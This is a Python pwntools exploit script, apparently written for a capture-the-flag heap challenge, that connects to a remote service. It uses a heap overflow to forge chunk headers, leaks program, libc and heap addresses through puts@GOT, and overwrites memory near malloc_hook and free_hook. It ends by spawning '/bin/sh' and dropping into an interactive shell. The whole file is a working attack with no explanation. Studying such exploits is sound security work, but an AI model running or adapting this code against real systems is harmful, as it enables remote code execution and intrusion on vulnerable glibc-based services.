#!/usr/bin/python
from pwn import *

p = remote("185.168.131.144",6000)
#p = process("./chall2",env={"LD_PRELOAD":"./libc-2.24.so"})
raw_input()

def menu():
	p.recvuntil("5. View your bank status")

def cr7(idx,new_t):
	menu()
	p.sendline("2")
	p.recvuntil("account:")
	p.sendline(str(idx))
	sleep(0.2)
	p.send(new_t)

def create(title,size,desc):
	menu()
	p.sendline("1")
	p.recvuntil("account:")
	p.sendline(title)
	p.recvuntil("statement:")
	p.sendline(str(size))
	sleep(0.2)
	p.sendline(desc)

def edit_title(idx,new_t):
	menu()
	p.sendline("2")
	p.recvuntil("account:")
	p.sendline(str(idx))
	sleep(0.2)
	p.sendline(new_t)

def edit_desc(idx,new_d):
	menu()
	p.sendline("3")
	p.recvuntil("account:")
	p.sendline(str(idx))
	sleep(0.2)
	p.sendline(new_d)

def show(idx):
	menu()
	p.sendline("5")
	p.recvuntil("account")
	p.sendline(str(idx))

def shutdown(idx):
	menu()
	p.sendline("4")
	p.recvuntil("account:")
	p.sendline(str(idx))

lol = "A"*8
fake_chunk = p64(0x00)
fake_chunk += p64(0x51)
name = "B"*16
name += fake_chunk
name2 = "C"*8

create(lol,12,name2)		# 0
create(lol,20,name2)
shutdown(1)
create(lol,38,"FFFFFFFF")	# 1

# Now overflow.
lol = "A"*16
lol += "\xb1"
create(lol,12,name2)		# 2
create("HHHH",48,name)	# 3
create("HHHH",48,"LLLLLLL")	# 4

shutdown(1)

# Now we have 0x71 chunk overflow into 3rd.

buf = "X"*16
buf += p64(0xffffffffff600000)
buf += "\x00\x20"
create("1234",4,"6")
create("1234",80,buf)

# Use payload to first leak and then finally attack.
payload = "Y"*87
edit_title(3,payload)

show(3)
#p.interactive()
p.recvuntil("YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY\n")
#print p.recv(6)
#p.interactive()
bss = p.recv(6)
bss = bss.ljust(8,"\x00")
#bss = "\x88" + bss
bss = u64(bss) - 0x202010
log.success("Text: " + hex(bss))
raw_input()

payload = "Y"*88
payload += p64(0xffffffffff600000)
payload += p64(0x2000)
payload += p64(bss + 0x0000000000201f78)	# puts@GOT
edit_title(3,payload)
raw_input()
# Leak libc.
show(4)
p.recvuntil("Statement: ")
libc = p.recv(6)
libc += "\x00"*2
libc = u64(libc) - 0x68f90 - 0x176c0
log.success("Libc: " + hex(libc))

payload = "Y"*88
payload += p64(0xffffffffff600000)
payload += p64(0x2000)
payload += p64(bss + 0x0000000000202060)	# bank.
edit_title(3,payload)

# Leak heap.
show(4)
p.recvuntil("Statement: ")
heap = p.recv(6)
heap += "\x00"*2
heap = u64(heap) - 0x10
log.success("Heap: " + hex(heap))

malloc_hook = bss + 0x20203d
#magic = libc + 0x3f35a
magic = libc + 0xd694f
#magic = libc + 0x3f306

payload = "Y"*88
payload += p64(0xffffffffff600000)
payload += p64(0x2000)
payload += p64(libc+0x3986f5)
edit_title(3,payload)

lol = "GGWP"
create(lol,90,"HH")		# 6
shutdown(6)

payload = "Y"*88
payload += p64(0xffffffffff600000)
payload += p64(0x2000)
payload += p64(libc+0x3986f5)
payload += "Z"*16
payload += p64(0x41)
payload += p64(0x00)
payload += "Z"*48
payload += p64(0x31)
payload += p64(0x00)
payload += "Z"*32
payload += p64(0x71)
payload += p64(libc+0x3986f5)
edit_title(3,payload)

#raw_input()
create("GGWP",90,"LL")
fake_construct = p64(0xffffffffff600000)
fake_construct += p64(0x2000)
fake_construct += p64(0xffffffffff600000)

create("GGWP",90,fake_construct)
raw_input("CHECK")

shutdown(6)
payload = "Y"*88
payload += p64(0xffffffffff600000)
payload += p64(0x2000)
payload += p64(malloc_hook)
payload += "Z"*16
payload += p64(0x41)
payload += p64(0x00)
payload += "Z"*48
payload += p64(0x31)
payload += p64(0x00)
payload += "Z"*32
payload += p64(0x71)
payload += p64(malloc_hook)
edit_title(3,payload)

create("GGWP",90,"LL")

#p.interactive()

finale = "/bin/sh\x00"
finale += "X"*11
finale += p64(libc + 0x398705)	# far from __free_hook
finale += p64(0x00)*6
finale += p64(0x00)[0:6]
raw_input("AS")
create("GGWP",90,finale)
raw_input()

new = "\x00"*(0x1088-0x1d)
new += p64(libc + 0x3f480)[0:6]
#new = p64(0x00)*12
#new += p64(libc + 0x398c1e)
cr7(0,new)

raw_input()
#shutdown(8)

p.interactive()
